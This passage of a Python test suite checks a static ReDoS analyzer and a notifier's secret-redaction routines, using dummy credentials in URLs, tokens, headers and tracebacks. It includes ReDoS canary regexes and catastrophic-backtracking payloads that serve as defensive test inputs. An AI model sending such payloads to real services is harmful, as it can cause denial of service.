                idx += 1
                # In regex, a ']' immediately after '[' or '[^' is a literal ']' character, not the closing delimiter
                if idx < len(s) and s[idx] == "^":
                    curr.append(s[idx])
                    idx += 1
                if idx < len(s) and s[idx] == "]":
                    curr.append(s[idx])
                    idx += 1
                continue
            if ch == "]" and in_cls:
                in_cls = False
                curr.append(ch)
                idx += 1
                continue
            if not in_cls:
                if ch == "(":
                    depth += 1
                elif ch == ")":
                    if depth > 0:
                        depth -= 1
                elif ch == "|" and depth == 0:
                    alts.append("".join(curr))
                    curr = []
                    idx += 1
                    continue
            curr.append(ch)
            idx += 1
        alts.append("".join(curr))
        return alts

    for start, end, inner, quantifier in groups:
        clean_inner = re.sub(r"^\?(?:P<[^>]+>|[:!=]|<[=!])", "", inner)

        # 2. Check for N-way alternation inside quantified group
        if quantifier:
            alts = split_top_level_alts(clean_inner)
            if len(alts) > 1:
                for a, b in itertools.combinations(alts, 2):
                    if a == b or a in b or b in a:
                        issues.append(f"Overlapping alternation with quantifier: ({a}|{b})")
                        break

            # 3. Check for nested quantifiers inside this quantified group
            stripped = strip_char_classes(clean_inner)
            stripped_no_classes = re.sub(r"\[x+\]", "", stripped)
            has_inner_parens = bool(re.search(r"(?<!\\)\(", stripped_no_classes))
            has_inner_quantifier = bool(re.search(r"(?<!\\)(?:[\+\*]|\{\d+(?:,\d*)?\})", stripped_no_classes))

            if has_inner_quantifier:
                if has_inner_parens:
                    issues.append("Nested quantifiers detected on group (inner-paren quantifier)")
                else:
                    issues.append("Nested quantifiers detected on group")

    # 4. Check for unbounded outer quantifiers on generic wildcards
    if re.search(r"(?<!\\)\.[\+\*](?!\?)", pattern_str):
        issues.append("Unbounded greedy wildcard .")

    return issues


def test_redos_analyzer_detects_known_canary_patterns():
    """Verify analyze_redos_vulnerabilities statically detects known ReDoS canary patterns."""
    canaries = [
        (r"(a+)+", "Nested quantifiers detected on group"),
        (r"(x|x)*", "Overlapping alternation with quantifier"),
        (r"(ya29\.[\w-]+)+", "Nested quantifiers detected on group"),
        (r"a.*b", "Unbounded greedy wildcard ."),
    ]
    for canary, expected_issue in canaries:
        detected = analyze_redos_vulnerabilities(canary)
        assert detected, f"Canary pattern '{canary}' was not detected by analyze_redos_vulnerabilities"
        assert any(expected_issue in issue for issue in detected), (
            f"Expected issue containing '{expected_issue}' for canary '{canary}', got: {detected}"
        )


def test_redos_analyzer_detects_nested_group_with_inner_parens():
    """Nebula Cycle 14: Balanced-parentheses stack inspection detects nested quantifiers and inner-paren quantifiers."""
    issues_nested = analyze_redos_vulnerabilities(r"((a+)+)+")
    assert issues_nested, "Expected ReDoS issues for ((a+)+)+"
    assert any("nested quantifiers" in i.lower() for i in issues_nested)

    issues_inner = analyze_redos_vulnerabilities(r"(x(y+)z)*")
    assert issues_inner, "Expected ReDoS issues for (x(y+)z)*"
    assert any("inner-paren quantifier" in i.lower() or "inner" in i.lower() for i in issues_inner)


def test_redos_analyzer_detects_three_way_overlapping_alternation():
    """Nebula Cycle 14: N-way alternation detection catches overlapping branches across combinations."""
    issues = analyze_redos_vulnerabilities(r"(a|b|ab)+")
    assert issues, "Expected ReDoS issues for (a|b|ab)+"
    assert any("overlapping alternation" in i.lower() for i in issues)


def test_redos_analyzer_handles_literal_bracket_in_char_class():
    """Nebula Cycle 15: Character-class literal ']' parsing ([...] and [^...])."""
    # 1. Literal ']' at start of class
    issues_literal_bracket = analyze_redos_vulnerabilities(r"[]abc]+")
    assert not issues_literal_bracket, f"Unexpected issues for r'[]abc]+': {issues_literal_bracket}"

    # 2. Literal ']' after negated '^'
    issues_negated_literal_bracket = analyze_redos_vulnerabilities(r"[^]abc]+")
    assert not issues_negated_literal_bracket, f"Unexpected issues for r'[^]abc]+': {issues_negated_literal_bracket}"


def test_redos_analyzer_flags_unbalanced_parentheses():
    """Nebula Cycle 15: Flag unanalyzable patterns with unbalanced parentheses."""
    issues = analyze_redos_vulnerabilities(r"(abc(")
    assert issues, "Expected issues for unbalanced parentheses pattern r'(abc('"
    assert any("UNANALYZABLE: unbalanced groups" in issue for issue in issues)


def test_constant_factor_blowup_is_bounded(tmp_path):
    """Nebula Cycle 14: Feeds 64KB payload to redact_secrets, asserting execution time < 250ms."""
    env_file = tmp_path / ".env"
    env_file.write_text("TELEGRAM_BOT_TOKEN=test-token-123\n")
    notifier = HermesTelegramNotifier(env_file=env_file, target_chat_id="1431349185")

    payload = "A" * 65536
    start = time.perf_counter()
    out = notifier.redact_secrets(payload)
    elapsed = time.perf_counter() - start

    assert elapsed < 0.250, f"Redaction of 64KB payload took {elapsed*1000:.2f}ms; expected < 250ms"
    assert isinstance(out, str)


def test_adversarial_backtracking_payload(tmp_path):
    """Nebula Cycle 14: Feeds evil near-match string without terminating boundary to redact_secrets, asserting < 250ms."""
    env_file = tmp_path / ".env"
    env_file.write_text("TELEGRAM_BOT_TOKEN=test-token-123\n")
    notifier = HermesTelegramNotifier(env_file=env_file, target_chat_id="1431349185")

    evil_payload = "ya29." + "a" * 10000
    start = time.perf_counter()
    out = notifier.redact_secrets(evil_payload)
    elapsed = time.perf_counter() - start

    assert elapsed < 0.250, f"Adversarial backtracking near-match took {elapsed*1000:.2f}ms; expected < 250ms"
    assert isinstance(out, str)


def test_redos_timing_bound(tmp_path):
    """CWE-1333: redact_secrets completes within reasonable latency and scales sub-quadratically on repeating stress inputs."""
    env_file = tmp_path / ".env"
    env_file.write_text("TELEGRAM_BOT_TOKEN=test-token-123\n")
    notifier = HermesTelegramNotifier(env_file=env_file, target_chat_id="1431349185")

    def measure_median(func, payload: str, runs: int = 5) -> float:
        times = []
        for _ in range(runs):
            s = time.perf_counter()
            func(payload)
            times.append(time.perf_counter() - s)
        return statistics.median(times)

    # 4KB string consisting of repeated /+=
    stress_payload = ("/+=" * 1500)[:4096]
    median_inst = measure_median(notifier.redact_secrets, stress_payload, runs=5)
    assert median_inst < 0.250, f"Instance redaction median took {median_inst*1000:.2f}ms; expected < 250ms"

    # Classmethod invocation verification
    median_cls = measure_median(HermesTelegramNotifier.redact_secrets, stress_payload, runs=5)
    assert median_cls < 0.250, f"Classmethod redaction median took {median_cls*1000:.2f}ms; expected < 250ms"

    # Nebula F1: Linear scaling verification (4x input length must scale sub-quadratically)
    def measure(n):
        return measure_median(notifier.redact_secrets, ("/+=" * n)[:n], runs=5)

    small_t = measure(2048)
    large_t = measure(8192)
    # 4x input length must scale sub-quadratically (not blow up > 6x or > 150ms)
    assert large_t < max(small_t * 6, 0.150), f"4x input grew {large_t/small_t:.1f}x; expected near-linear"

    # Nebula F1: Verify pattern quantifiers in all credential patterns via static ReDoS analyzer
    all_patterns = [
        *HermesTelegramNotifier._SECRET_PATTERNS,
        HermesTelegramNotifier._URL_CRED_PATTERN,
        HermesTelegramNotifier._QUERY_PARAM_PATTERN,
        HermesTelegramNotifier._BASIC_AUTH_PATTERN,
        HermesTelegramNotifier._KV_SECRET_PATTERN,
        HermesTelegramNotifier._PEM_KEY_PATTERN,
    ]
    for pat in all_patterns:
        issues = analyze_redos_vulnerabilities(pat.pattern)
        assert not issues, f"Pattern '{pat.pattern}' flagged for ReDoS: {issues}"


@pytest.mark.parametrize("limit", [100, 120])
def test_truncation_boundary_secret_never_leaks_fragment(tmp_path, limit):
    """CWE-532 / CWE-116: Secrets whose tail straddles the truncation boundary never leak fragments >= 6 characters."""
    env_file = tmp_path / ".env"
    env_file.write_text("TELEGRAM_BOT_TOKEN=test-token-123\n")
    notifier = HermesTelegramNotifier(env_file=env_file, target_chat_id="1431349185")

    secret_raw = "SUPER_SECRET_PAYLOAD_TOKEN_9876543210"
    # Place secret so its first 10 characters are before limit, and tail crosses limit
    prefix = "A" * (limit - 10)
    full_text = prefix + secret_raw

    out = notifier.sanitize_error(full_text, limit=limit, known_secrets={secret_raw})

    # Nebula F2: Verify [REDACTED] is present in output, confirming redaction occurred before truncation
    assert "[REDACTED]" in out

    # Nebula F2: Verify no fragment >= 6 characters of secret_raw appears in the output
    for i in range(len(secret_raw) - 5):
        frag = secret_raw[i : i + 6]
        assert frag not in out, f"Leaked {len(frag)}-char fragment '{frag}' at offset {i} in '{out}'"

    # Also test with a pattern-matched secret (e.g. Bearer token) straddling the boundary
    bearer_secret = "Bearer " + ("Z" * 50)
    full_bearer_text = ("X" * (limit - 16)) + " " + bearer_secret
    out_bearer = notifier.sanitize_error(full_bearer_text, limit=limit)
    assert "[REDACTED]" in out_bearer
    for i in range(len(bearer_secret) - 5):
        frag = bearer_secret[i : i + 6]
        assert frag not in out_bearer, f"Leaked bearer fragment '{frag}' in '{out_bearer}'"


def test_escape_redact_ordering_with_html_special_chars(tmp_path):
    """CWE-116 / CWE-532: Passwords with HTML special characters inside DB URLs are redacted before escaping."""
    env_file = tmp_path / ".env"
    env_file.write_text("TELEGRAM_BOT_TOKEN=test-token-123\n")
    notifier = HermesTelegramNotifier(env_file=env_file, target_chat_id="1431349185")

    raw_password = "p&ss<w>ord"
    db_url = f"postgresql://user:{raw_password}@db:5432/main"

    out_sanitized = notifier.sanitize_error(db_url, limit=120)
    out_redacted = notifier.redact_secrets(db_url)

    # Verify neither raw password nor escaped p&amp;ss&lt;w&gt;ord appears in sanitized output
    assert raw_password not in out_sanitized
    assert "p&amp;ss&lt;w&gt;ord" not in out_sanitized
    assert html.escape(raw_password, quote=True) not in out_sanitized
    assert "[REDACTED]" in out_sanitized
    assert "postgresql://user:[REDACTED]@db:5432/main" in out_sanitized

    assert raw_password not in out_redacted
    assert "postgresql://user:[REDACTED]@db:5432/main" in out_redacted

    # Verify through format_urgent_alert
    scan = {
        "overall_health_score": 20,
        "severity": "CRITICAL",
        "cron": {
            "clogged_jobs": [
                {
                    "job_name": "db-job",
                    "consecutive_failures": 3,
                    "last_error": f"Failed: {db_url}",
                }
            ],
            "ticker_heartbeat": {"is_stale": False, "age_seconds": 1.0},
        },
    }
    alert_out = notifier.format_urgent_alert(scan)
    assert raw_password not in alert_out
    assert "p&amp;ss&lt;w&gt;ord" not in alert_out
    assert "[REDACTED]" in alert_out


def test_known_env_value_exact_verbatim_redacted(tmp_path):
    """Defense B1: Known secrets loaded from .env are scrubbed verbatim even when unformatted."""
    unique_secret = "TEST_SOVEREIGN_KEY_9876543210"
    env_file = tmp_path / ".env"
    env_file.write_text(f"TELEGRAM_BOT_TOKEN=test-token-123\nAPP_API_KEY={unique_secret}\n")

    notifier = HermesTelegramNotifier(env_file=env_file, target_chat_id="1431349185")
    assert unique_secret in notifier._known_secrets

    # Put it completely unformatted into last_error (no prefix, no URL, no password=)
    raw_error = f"Fatal system crash while processing payload: {unique_secret} at node 4"
    scan = {
        "overall_health_score": 10,
        "severity": "CRITICAL",
        "cron": {
            "clogged_jobs": [
                {
                    "job_name": "sovereign-job",
                    "consecutive_failures": 3,
                    "last_error": raw_error,
                }
            ],
            "ticker_heartbeat": {"is_stale": False, "age_seconds": 1.0},
        },
    }
    out = notifier.format_urgent_alert(scan)

    assert unique_secret not in out
    assert "[REDACTED]" in out

    sanitized = notifier.sanitize_error(raw_error)
    assert unique_secret not in sanitized
    assert "[REDACTED]" in sanitized

    redacted = notifier.redact_secrets(raw_error)
    assert unique_secret not in redacted
    assert "[REDACTED]" in redacted


def test_uppercase_jdbc_query_param_basic_auth_redacted(tmp_path):
    """Defense A3: Uppercase JDBC schemes, query parameter credentials, and Basic Authorization are redacted."""
    env_file = tmp_path / ".env"
    env_file.write_text("TELEGRAM_BOT_TOKEN=test-token-123\n")
    notifier = HermesTelegramNotifier(env_file=env_file, target_chat_id="1431349185")

    # 1. Uppercase JDBC URL
    jdbc_url = "JDBC:POSTGRESQL://admin:MyPass123@localhost:5432/db"
    out_jdbc = notifier.redact_secrets(jdbc_url)
    assert "MyPass123" not in out_jdbc
    assert "JDBC:POSTGRESQL://admin:[REDACTED]@localhost:5432/db" in out_jdbc

    # 2. Query Parameter Credentials
    query_url = "https://api.example.com/data?token=SuperSecretQueryParamToken12345"
    out_query = notifier.redact_secrets(query_url)
    assert "SuperSecretQueryParamToken12345" not in out_query
    assert "https://api.example.com/data?token=[REDACTED]" in out_query

    # Query Parameter in middle of URL with other params
    multi_param_url = "https://api.example.com/v1?page=1&api_key=UltraSecretKey9988&format=json"
    out_multi = notifier.redact_secrets(multi_param_url)
    assert "UltraSecretKey9988" not in out_multi
    assert "https://api.example.com/v1?page=1&api_key=[REDACTED]&format=json" in out_multi

    # 3. Basic Authorization Header
    basic_auth = "Authorization: Basic dXNlcjpwYXNzd29yZDEyMw=="
    out_auth = notifier.redact_secrets(basic_auth)
    assert "dXNlcjpwYXNzd29yZDEyMw==" not in out_auth
    assert "Authorization: Basic [REDACTED]" in out_auth


def test_false_positive_guard_for_clean_identifiers(tmp_path):
    """Defense B3: Verify legitimate 12-digit numbers, order IDs, chat IDs, and epochs are NOT corrupted."""
    env_file = tmp_path / ".env"
    env_file.write_text("TELEGRAM_BOT_TOKEN=test-token-123\n")
    notifier = HermesTelegramNotifier(env_file=env_file, target_chat_id="1431349185")

    chat_id = "1431349185"
    order_id = "987654321012"
    epoch_ts = "1728848000"
    job_uuid = "46a4a24c-0878-434e-989d-35d64421bbca"

    clean_message = (
        f"Order {order_id} sent to chat {chat_id} at epoch {epoch_ts} for job {job_uuid}"
    )

    out = notifier.redact_secrets(clean_message)
    assert out == clean_message
    assert "[REDACTED]" not in out

    sanitized = notifier.sanitize_error(clean_message, limit=200)
    assert order_id in sanitized
    assert chat_id in sanitized
    assert epoch_ts in sanitized
    assert job_uuid in sanitized
    assert "[REDACTED]" not in sanitized


def test_multi_secret_per_line_all_redacted(tmp_path):
    """CWE-532 / Nebula F4: Multiple credentials on a single line are all redacted simultaneously."""
    env_file = tmp_path / ".env"
    env_file.write_text("TELEGRAM_BOT_TOKEN=test-token-123\n")
    notifier = HermesTelegramNotifier(env_file=env_file, target_chat_id="1431349185")

    raw_text = (
        'postgresql://user:pass123@host:5432/db with token ya29.A0ARrdaM-12345 and password="fooBarPassword"'
    )
    redacted = notifier.redact_secrets(raw_text)

    assert "pass123" not in redacted
    assert "A0ARrdaM" not in redacted
    assert "fooBarPassword" not in redacted
    assert "postgresql://user:[REDACTED]@host:5432/db" in redacted
    assert "token [REDACTED]" in redacted
    assert "password=[REDACTED]" in redacted

    sanitized = notifier.sanitize_error(raw_text, limit=300)
    assert "pass123" not in sanitized
    assert "A0ARrdaM" not in sanitized
    assert "fooBarPassword" not in sanitized
    assert "[REDACTED]" in sanitized


def test_secret_split_across_traceback_newlines(tmp_path):
    """CWE-532 / Nebula F4: Multi-line traceback with distinct credentials across newlines are all redacted."""
    env_file = tmp_path / ".env"
    env_file.write_text("TELEGRAM_BOT_TOKEN=test-token-123\n")
    notifier = HermesTelegramNotifier(env_file=env_file, target_chat_id="1431349185")

    traceback_str = (
        "Traceback (most recent call last):\n"
        '  File "db.py", line 12, in connect\n'
        '    engine = create_engine("mysql://root:secretPass99@db.prod.internal:3306/main")\n'
        '  File "auth.py", line 45, in request_token\n'
        '    headers = {"X-Api-Key": "AIzaSyD-1234567890abcdefghijklmnopqrstu"}\n'
        '  File "google_auth.py", line 88, in refresh\n'
        '    refresh_token = "1//04testRefreshToken9876543210-abcdef"\n'
        "RuntimeError: Authentication failed"
    )

    redacted = notifier.redact_secrets(traceback_str)
    assert "secretPass99" not in redacted
    assert "AIzaSyD-1234567890abcdefghijklmnopqrstu" not in redacted
    assert "1//04testRefreshToken9876543210-abcdef" not in redacted
    assert "mysql://root:[REDACTED]@db.prod.internal:3306/main" in redacted

    sanitized = notifier.sanitize_error(traceback_str, limit=500)
    assert "secretPass99" not in sanitized
    assert "AIzaSyD-1234567890abcdefghijklmnopqrstu" not in sanitized
    assert "1//04testRefreshToken9876543210-abcdef" not in sanitized
    assert "[REDACTED]" in sanitized


def test_percent_encoded_and_unicode_passwords_in_url(tmp_path):
    """CWE-532 / CWE-259 / Nebula F4: URLs containing percent-encoded and unicode passwords are fully redacted."""
    env_file = tmp_path / ".env"
    env_file.write_text("TELEGRAM_BOT_TOKEN=test-token-123\n")
    notifier = HermesTelegramNotifier(env_file=env_file, target_chat_id="1431349185")

    # 1. Percent-encoded password containing %26 (&) and %40 (@)
    percent_url = "postgresql://user:p%26ss%40word123@host:5432/db"
    redacted_percent = notifier.redact_secrets(percent_url)
    assert "p%26ss%40word123" not in redacted_percent
    assert "postgresql://user:[REDACTED]@host:5432/db" in redacted_percent

    sanitized_percent = notifier.sanitize_error(percent_url, limit=120)
    assert "p%26ss%40word123" not in sanitized_percent
    assert "[REDACTED]" in sanitized_percent

    # 2. Unicode characters in password
    unicode_url = "mysql://admin:pàsswórd123@host:3306/db"
    redacted_unicode = notifier.redact_secrets(unicode_url)
    assert "pàsswórd123" not in redacted_unicode
    assert "mysql://admin:[REDACTED]@host:3306/db" in redacted_unicode

    sanitized_unicode = notifier.sanitize_error(unicode_url, limit=120)
    assert "pàsswórd123" not in sanitized_unicode
    assert "[REDACTED]" in sanitized_unicode


def test_empty_or_none_known_secrets_fallback_to_regex(tmp_path):
    """CWE-532 / Nebula F4: Empty or None known_secrets cleanly falls back to regex redaction."""
    # 1. Explicit instantiation with empty _known_secrets
    notifier = HermesTelegramNotifier(env_file=Path("/nonexistent"), target_chat_id="123")
    notifier._known_secrets = set()

    err_text = (
        "Error: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.token123 "
        "and password=superSecretPass "
        "and postgresql://app:dbSecret123@localhost:5432/app"
    )

    out_inst = notifier.sanitize_error(err_text, limit=300)
    assert "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.token123" not in out_inst
    assert "superSecretPass" not in out_inst
    assert "dbSecret123" not in out_inst
    assert "[REDACTED]" in out_inst

    # 2. Classmethod with known_secrets=None
    out_cls_none = HermesTelegramNotifier.sanitize_error(err_text, limit=300, known_secrets=None)
    assert "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.token123" not in out_cls_none
    assert "superSecretPass" not in out_cls_none
    assert "dbSecret123" not in out_cls_none
    assert "[REDACTED]" in out_cls_none

    # 3. Classmethod with known_secrets=set()
    out_cls_empty = HermesTelegramNotifier.sanitize_error(err_text, limit=300, known_secrets=set())
    assert "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.token123" not in out_cls_empty
    assert "superSecretPass" not in out_cls_empty
    assert "dbSecret123" not in out_cls_empty
    assert "[REDACTED]" in out_cls_empty

    # 4. Direct redact_secrets with known_secrets=None
    redacted = HermesTelegramNotifier.redact_secrets(err_text, known_secrets=None)
    assert "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.token123" not in redacted
    assert "superSecretPass" not in redacted
    assert "dbSecret123" not in redacted
    assert "[REDACTED]" in redacted
